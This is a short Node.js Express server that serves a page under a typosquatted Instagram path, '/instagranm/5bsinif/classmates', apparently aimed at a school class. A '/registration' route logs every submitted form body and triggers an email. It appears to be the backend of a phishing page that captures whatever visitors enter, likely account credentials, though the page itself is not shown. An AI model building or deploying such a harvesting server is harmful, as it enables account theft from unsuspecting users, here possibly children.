var http = require('http');
var express = require('express');
const sendMail =  require('./mail');
const path = require('path');
var app = express();

app.use('/instagranm/5bsinif/classmates',express.static('public'));

app.use(express.urlencoded({
    extended:false
}));
app.use(express.json());

app.get('/instagranm/5bsinif/classmates', (req,res) => {
      res.sendFile(path.join(__dirname,'index.html'))
      console.log(__dirname,"dirname")
});


app.post('/registration', (req,res) => {
    console.log('Data',req.body);
    sendMail();
    res.json({message: 'Message received'});
});

 

app.listen(80, ()=>{
    console.log('server is listening')
})